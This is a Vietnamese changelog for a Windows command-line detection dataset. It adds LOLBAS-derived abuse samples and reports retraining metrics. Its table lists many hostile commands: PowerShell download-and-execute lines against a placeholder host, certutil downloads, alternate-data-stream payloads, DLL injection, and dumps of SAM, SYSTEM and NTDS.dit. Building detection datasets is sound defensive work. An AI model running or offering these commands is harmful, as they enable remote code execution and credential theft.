# Bổ sung SSH vào raw và windows_8 ngày 11/11/2026

Hai mẫu dưới đây đã được thêm liền nhóm SSH trong `data/raw/windows.csv` và `data/windows_8.csv`. Raw có 3.217 mẫu, gồm 2.754 GOOD và 463 BAD/Abuse/Suspicious. Bản windows_8 có 3.272 mẫu, gồm 2.806 GOOD và 466 BAD/Abuse/Suspicious.

| Nhãn | Lệnh | Template nguồn |
| --- | --- | --- |
| 1 | `ssh localhost "cmd /c c:\windows\system32\calc.exe"` | `ssh localhost "{CMD}"` |
| 1 | `ssh -o ProxyCommand="cmd /c c:\windows\system32\calc.exe" .` | `ssh -o ProxyCommand="{CMD}" .` |

Nguồn là [LOLBAS Ssh.yml tại commit đã ghim](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Ssh.yml), kỹ thuật T1202. `{CMD}` được điền bằng lệnh CMD mở Calculator theo mẫu người dùng cung cấp. Đây là mẫu minh họa cơ chế thực thi gián tiếp, nhãn 1 mang nghĩa abuse/suspicious theo chính sách dự án. Ý đồ tấn công cần ngữ cảnh bổ sung. Trường hợp localhost cần SSH server và xác thực phù hợp. Chỉ phân tích văn bản, chưa kiểm chứng thực thi trong lab Windows.

Bổ sung feature `win_ssh_loopback_shell` vì mẫu localhost trước đây chỉ sinh `COMMAND_SSH`, trùng vector một mẫu GOOD. Kiểm tra riêng tên host, shell và vị trí thực thi. Hai bản CSV trước bổ sung được sao lưu tại `D:\APT\ssh-dataset-additions-20261111`.

Sau huấn luyện lại từ raw, tập test có 322 mẫu, Accuracy 97,20%, F1 BAD 90,32%, FP 5 và FN 4. Việc thêm dữ liệu làm thay đổi thành phần của phép chia stratified 90/10, nên các điểm này chưa chứng minh cải thiện so với lần chạy trước trên một tập test cố định. Có 27 kiểm thử feature, integrity và BLEU đạt.

Kiểm tra hai mẫu mới cho kết quả ProxyCommand là BAD, xác suất 0,99. Mẫu localhost là GOOD, xác suất 0,22. Mẫu localhost duy nhất nằm trong test theo phép chia hiện tại, vì vậy feature mới chưa xuất hiện trong vocabulary học từ train. Tập dữ liệu đã có mẫu này nhưng mô hình vẫn bỏ sót cơ chế đó trong lần chạy này.

## Lịch sử xây dựng windows_7

# Bổ sung template LOLBAS ngày 11/11/2026

Tổng cộng 3,215 lệnh, gồm 2,754 nhãn 0 và 461 nhãn 1. Thêm 75 biến thể từ 45 nhóm công cụ. Các lệnh cũ và nhãn được giữ nguyên, các dòng được sắp xếp theo công cụ.

Các dòng mới là mẫu tổng hợp từ template LOLBAS đã ghim commit. URL thuộc example.test và IP 192.0.2.25 là địa chỉ minh họa. Chúng chỉ được xử lý như văn bản. Chỉ kiểm tra cấu trúc tĩnh và feature, chưa xác nhận chạy thành công trên từng phiên bản Windows hoặc với các prerequisite cụ thể.

Các placeholder CMD được ghép với biểu thức PowerShell tải và đánh giá script, dựa trên cơ chế DownloadString/IEX mà LOLBAS mô tả. Đây là biến thể tổng hợp có chủ đích, cần nhóm cùng family khi chia tập để tránh rò rỉ giữa train và test. Nhãn 1 giữ nghĩa abuse/suspicious theo chính sách hiện tại, chưa phải ground truth từ một cuộc tấn công thực tế.

Calc.exe là chương trình Windows thường dùng làm PoC. Thay tên calc.exe hoặc thay IP/path đơn thuần chưa tạo bằng chứng tấn công. 24 template cần ngữ cảnh được để lại trong nhật ký. Một mẫu ImageView_Fullscreen bị giữ ngoài vì vector hiện tại trùng một mẫu GOOD. Năm biến thể trùng đã được bỏ qua.

Không phát hiện xung đột exact sau chuẩn hóa khoảng trắng/chữ hoa thường hoặc vector feature đối với GOOD trong các dòng được thêm. Đây là kiểm tra kỹ thuật, không chứng minh triệt tiêu mọi xung đột ngữ nghĩa. Nhật ký ghi mẫu GOOD gần nhất của cùng công cụ để đối chiếu.

Đã sửa dấu ngoặc thừa trong biểu thức nguồn SyncAppvPublishingServer.vbs, quote đường dẫn msedge_proxy có khoảng trắng, dùng UNC share cho backupTarget của wbadmin, và đổi tên task thành tên trung tính. Mô hình chưa được train lại với dữ liệu này.

## Các mẫu mới và nguồn

| Record mới | Công cụ | Lệnh | LOLBAS record | Nguồn |
| --- | --- | --- | --- | --- |
| 17 | at | <code>C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))</code> | 10 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/At.yml) |
| 212 | certutil | <code>certutil.exe -urlcache -f https://updates.example.test/lab/sample.exe C:\ProgramData\LotLDetectionLab\sample.exe</code> | 25 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml) |
| 217 | certutil | <code>certutil.exe -verifyctl -f https://updates.example.test/lab/sample.exe C:\ProgramData\LotLDetectionLab\sample.exe</code> | 26 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml) |
| 213 | certutil | <code>certutil.exe -urlcache -f https://updates.example.test/lab/sample.ps1 C:\ProgramData\LotLDetectionLab\sample.txt:ttt</code> | 27 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml) |
| 341 | cmd | <code>cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://updates.example.test/lab/sample.sct ^scrobj.dll &gt; C:\ProgramData\LotLDetectionLab\sample.txt:payload.bat</code> | 35 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Cmd.yml) |
| 342 | cmstp | <code>cmstp.exe /ni /s https://updates.example.test/lab/sample.inf</code> | 42 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Cmstp.yml) |
| 344 | conhost | <code>conhost.exe powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))</code> | 48 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Conhost.yml) |
| 343 | conhost | <code>conhost.exe --headless powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))</code> | 49 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Conhost.yml) |
| 348 | control | <code>control.exe C:\ProgramData\LotLDetectionLab\sample.txt:evil.dll</code> | 50 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Control.yml) |
| 363 | cscript | <code>cscript //e:vbscript C:\ProgramData\LotLDetectionLab\sample.txt:script.vbs</code> | 54 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Cscript.yml) |
| 403 | desktopimgdownldr | <code>set &quot;SYSTEMROOT=C:\Windows\Temp&quot; &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://updates.example.test/lab/lockscreen.jpg /eventName:desktopimgdownldr</code> | 57 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Desktopimgdownldr.yml) |
| 406 | diantz | <code>diantz.exe C:\ProgramData\LotLDetectionLab\sample.exe C:\ProgramData\LotLDetectionLab\sample.txt:targetFile.cab</code> | 60 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Diantz.yml) |
| 481 | esentutl | <code>esentutl.exe /y C:\ProgramData\LotLDetectionLab\sample.exe /d C:\ProgramData\LotLDetectionLab\sample.txt:file.exe /o</code> | 67 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Esentutl.yml) |
| 482 | esentutl | <code>esentutl.exe /y C:\ProgramData\LotLDetectionLab\sample.txt:file.exe /d C:\ProgramData\LotLDetectionLab\sample.exe /o</code> | 68 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Esentutl.yml) |
| 475 | esentutl | <code>esentutl.exe /y \\192.0.2.25\lab\sample.exe /d C:\ProgramData\LotLDetectionLab\sample.txt:file.exe /o</code> | 69 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Esentutl.yml) |
| 468 | esentutl | <code>esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d C:\ProgramData\LotLDetectionLab\sample.dit</code> | 71 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Esentutl.yml) |
| 497 | expand | <code>expand \\192.0.2.25\lab\sample.bat C:\ProgramData\LotLDetectionLab\sample.txt:file.bat</code> | 77 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Expand.yml) |
| 507 | extrac32 | <code>extrac32 C:\ProgramData\LotLDetectionLab\sample.cab C:\ProgramData\LotLDetectionLab\sample.txt:file.exe</code> | 81 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Extrac32.yml) |
| 541 | findstr | <code>findstr /V /L W3AllLov3LolBas C:\ProgramData\LotLDetectionLab\sample.exe &gt; C:\ProgramData\LotLDetectionLab\sample.txt:file.exe</code> | 85 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Findstr.yml) |
| 539 | findstr | <code>findstr /V /L W3AllLov3LolBas \\192.0.2.25\lab\sample.exe &gt; C:\ProgramData\LotLDetectionLab\sample.txt:file.exe</code> | 86 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Findstr.yml) |
| 569 | forfiles | <code>forfiles /p c:\windows\system32 /m notepad.exe /c &quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 91 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Forfiles.yml) |
| 564 | forfiles | <code>forfiles /p c:\windows\system32 /m notepad.exe /c &quot;C:\ProgramData\LotLDetectionLab\sample.txt:evil.exe&quot;</code> | 92 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Forfiles.yml) |
| 1032 | ieexec | <code>ieexec.exe https://updates.example.test/lab/sample.exe</code> | 107 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Ieexec.yml) |
| 1057 | installutil | <code>InstallUtil.exe /logfile= /LogToConsole=false /U C:\ProgramData\LotLDetectionLab\sample.dll</code> | 112 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Installutil.yml) |
| 1069 | makecab | <code>makecab C:\ProgramData\LotLDetectionLab\sample.exe C:\ProgramData\LotLDetectionLab\sample.txt:autoruns.cab</code> | 120 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Makecab.yml) |
| 1066 | makecab | <code>makecab \\192.0.2.25\lab\sample.exe C:\ProgramData\LotLDetectionLab\sample.txt:file.cab</code> | 121 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Makecab.yml) |
| 1076 | mavinject | <code>MavInject.exe 3110 /INJECTRUNNING C:\ProgramData\LotLDetectionLab\sample.dll</code> | 124 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Mavinject.yml) |
| 1082 | mavinject | <code>Mavinject.exe 4172 /INJECTRUNNING C:\ProgramData\LotLDetectionLab\sample.txt:file.dll</code> | 125 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Mavinject.yml) |
| 1095 | mpcmdrun | <code>MpCmdRun.exe -DownloadFile -url https://updates.example.test/lab/sample.exe -path C:\ProgramData\LotLDetectionLab\sample.exe</code> | 133 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/MpCmdRun.yml) |
| 1096 | mpcmdrun | <code>MpCmdRun.exe -DownloadFile -url https://updates.example.test/lab/sample.exe -path C:\ProgramData\LotLDetectionLab\sample.exe:evil.exe</code> | 135 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/MpCmdRun.yml) |
| 1167 | msedge | <code>msedge.exe --disable-gpu-sandbox --gpu-launcher=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;)) &amp;&amp;&quot;</code> | 147 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Msedge.yml) |
| 1225 | mshta | <code>mshta.exe vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:https://updates.example.test/lab/sample.sct&quot;&quot;)&quot;))</code> | 149 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Mshta.yml) |
| 1219 | mshta | <code>mshta.exe javascript:a=GetObject(&quot;script:https://updates.example.test/lab/sample.sct&quot;).Exec();close();</code> | 150 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Mshta.yml) |
| 1210 | mshta | <code>mshta.exe &quot;C:\ProgramData\LotLDetectionLab\sample.txt:file.hta&quot;</code> | 151 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Mshta.yml) |
| 2046 | odbcconf | <code>odbcconf /a {REGSVR C:\ProgramData\LotLDetectionLab\sample.dll}</code> | 161 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Odbcconf.yml) |
| 2429 | printbrm | <code>PrintBrm -r -f C:\ProgramData\LotLDetectionLab\sample.txt:hidden.zip -d C:\ProgramData\LotLDetectionLab</code> | 180 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/PrintBrm.yml) |
| 2666 | reg | <code>reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\ProgramData\LotLDetectionLab\sample.txt:evilreg.reg</code> | 188 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Reg.yml) |
| 2675 | reg | <code>reg save HKLM\SECURITY C:\ProgramData\LotLDetectionLab\sample.1.bak &amp;&amp; reg save HKLM\SYSTEM C:\ProgramData\LotLDetectionLab\sample.2.bak &amp;&amp; reg save HKLM\SAM C:\ProgramData\LotLDetectionLab\sample.3.bak</code> | 189 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Reg.yml) |
| 2688 | regedit | <code>regedit /E C:\ProgramData\LotLDetectionLab\sample.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey</code> | 192 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Regedit.yml) |
| 2693 | regedit | <code>regedit C:\ProgramData\LotLDetectionLab\sample.txt:regfile.reg</code> | 193 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Regedit.yml) |
| 2699 | regini | <code>regini.exe C:\ProgramData\LotLDetectionLab\sample.txt:hidden.ini</code> | 194 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Regini.yml) |
| 2743 | regsvr32 | <code>regsvr32 /s /n /u /i:https://updates.example.test/lab/sample.sct scrobj.dll</code> | 198 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Regsvr32.yml) |
| 2748 | regsvr32 | <code>regsvr32.exe /s /u /i:C:\ProgramData\LotLDetectionLab\sample.sct scrobj.dll</code> | 199 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Regsvr32.yml) |
| 2855 | rundll32 | <code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://updates.example.test/lab/sample.sct&quot;)</code> | 211 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Rundll32.yml) |
| 2824 | rundll32 | <code>rundll32 &quot;C:\ProgramData\LotLDetectionLab\sample.txt:ADSDLL.dll&quot;,DllMain</code> | 212 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Rundll32.yml) |
| 2957 | schtasks | <code>schtasks /create /sc minute /mo 1 /tn &quot;LabUpdateCheck&quot; /tr &quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 219 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Schtasks.yml) |
| 2956 | schtasks | <code>schtasks /create /s LAB-WS01 /tn &quot;MyTask&quot; /tr &quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot; /sc daily</code> | 220 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Schtasks.yml) |
| 2966 | scp | <code>scp.exe -o ProxyCommand=&quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot; . localhost:.</code> | 221 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Scp.yml) |
| 2963 | scp | <code>scp -o PKCS11Provider=&quot;\\192.0.2.25\lab\sample.dll&quot; . win@github.com:.</code> | 223 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Scp.yml) |
| 2967 | sftp | <code>sftp -o ProxyCommand=&quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot; .</code> | 229 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Sftp.yml) |
| 2973 | ssh | <code>ssh -o ProxyCommand=&quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot; .</code> | 233 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Ssh.yml) |
| 2974 | syncappvpublishingserver | <code>SyncAppvPublishingServer.exe &quot;n;(New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/lab/sample.ps1&#x27;) &#124; IEX&quot;</code> | 237 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Syncappvpublishingserver.yml) |
| 3066 | wbadmin | <code>wbadmin start backup -backupTarget:\\192.0.2.25\lab-backup -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet</code> | 251 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wbadmin.yml) |
| 3113 | wmic | <code>wmic.exe process call create &quot;C:\ProgramData\LotLDetectionLab\sample.txt:program.exe&quot;</code> | 258 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wmic.yml) |
| 3118 | wmic | <code>wmic.exe process call create &quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 259 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wmic.yml) |
| 3111 | wmic | <code>wmic.exe /node:&quot;192.168.0.1&quot; process call create &quot;powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 260 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wmic.yml) |
| 3130 | wmic | <code>wmic.exe process get brief /format:&quot;https://updates.example.test/lab/sample.xsl&quot;</code> | 261 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wmic.yml) |
| 3123 | wmic | <code>wmic.exe process get brief /format:&quot;\\192.0.2.25\lab\sample.xsl&quot;</code> | 262 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wmic.yml) |
| 3157 | wscript | <code>wscript //e:vbscript C:\ProgramData\LotLDetectionLab\sample.txt:script.vbs</code> | 267 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wscript.yml) |
| 3156 | wscript | <code>echo GetObject(&quot;script:https://updates.example.test/lab/sample.js&quot;) &gt; C:\ProgramData\LotLDetectionLab\sample.txt:hi.js &amp;&amp; wscript.exe C:\ProgramData\LotLDetectionLab\sample.txt:hi.js</code> | 268 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wscript.yml) |
| 3188 | wuauclt | <code>wuauclt.exe /UpdateDeploymentProvider C:\ProgramData\LotLDetectionLab\sample.dll /RunHandlerComServer</code> | 270 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Wuauclt.yml) |
| 1171 | msedge_proxy | <code>&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe&quot; --disable-gpu-sandbox --gpu-launcher=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;)) &amp;&amp;&quot;</code> | 275 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/msedge_proxy.yml) |
| 1199 | msedgewebview2 | <code>msedgewebview2.exe --utility-cmd-prefix=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 277 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/msedgewebview2.yml) |
| 1195 | msedgewebview2 | <code>msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 278 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/msedgewebview2.yml) |
| 1197 | msedgewebview2 | <code>msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))&quot;</code> | 279 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/msedgewebview2.yml) |
| 3182 | wt | <code>wt.exe powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))</code> | 284 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/wt.yml) |
| 2831 | rundll32 | <code>rundll32 advpack.dll, RegisterOCX powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))</code> | 289 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSLibraries/Advpack.yml) |
| 2843 | rundll32 | <code>rundll32.exe desk.cpl,InstallScreenSaver \\192.0.2.25\lab\sample.scr</code> | 291 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSLibraries/Desk.yml) |
| 2835 | rundll32 | <code>rundll32 ieadvpack.dll, RegisterOCX powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;))</code> | 297 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSLibraries/Ieadvpack.yml) |
| 369 | cscript | <code>set comspec=C:\ProgramData\LotLDetectionLab\sample.exe &amp; cscript c:\windows\system32\manage-bde.wsf</code> | 327 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSScripts/Manage-bde.yml) |
| 2465 | pubprn.vbs | <code>pubprn.vbs 127.0.0.1 script:https://updates.example.test/lab/sample.sct</code> | 329 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSScripts/Pubprn.yml) |
| 2975 | syncappvpublishingserver.vbs | <code>SyncAppvPublishingServer.vbs &quot;n;(New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/lab/sample.ps1&#x27;) &#124; IEX&quot;</code> | 330 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSScripts/Syncappvpublishingserver.yml) |
| 1115 | mscopilot | <code>mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;)) &amp;&amp; taskkill /f /im mscopilot.exe &amp;&amp;&quot;</code> | 400 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Mscopilot.yml) |
| 1520 | msxsl | <code>msxsl.exe https://updates.example.test/lab/sample.xml https://updates.example.test/lab/sample.xsl -o C:\ProgramData\LotLDetectionLab\sample.txt:ads-name</code> | 412 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Msxsl.yml) |
| 3007 | teams | <code>teams.exe --disable-gpu-sandbox --gpu-launcher=&quot;cmd.exe /d /c powershell.exe -NoProfile -Command IEX((New-Object Net.WebClient).DownloadString(&#x27;https://updates.example.test/stage.ps1&#x27;)) &amp;&amp;&quot;</code> | 441 | [YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Teams.yml) |

## Nhật ký và bản sao

- D:/APT/lolbas-template-review-20261111/decisions.json lưu quyết định đối với đủ 490 mẫu nguồn.
- D:/APT/lolbas-template-review-20261111/proposed.json lưu lệnh gốc, thay thế, source hash, feature và GOOD gần nhất.
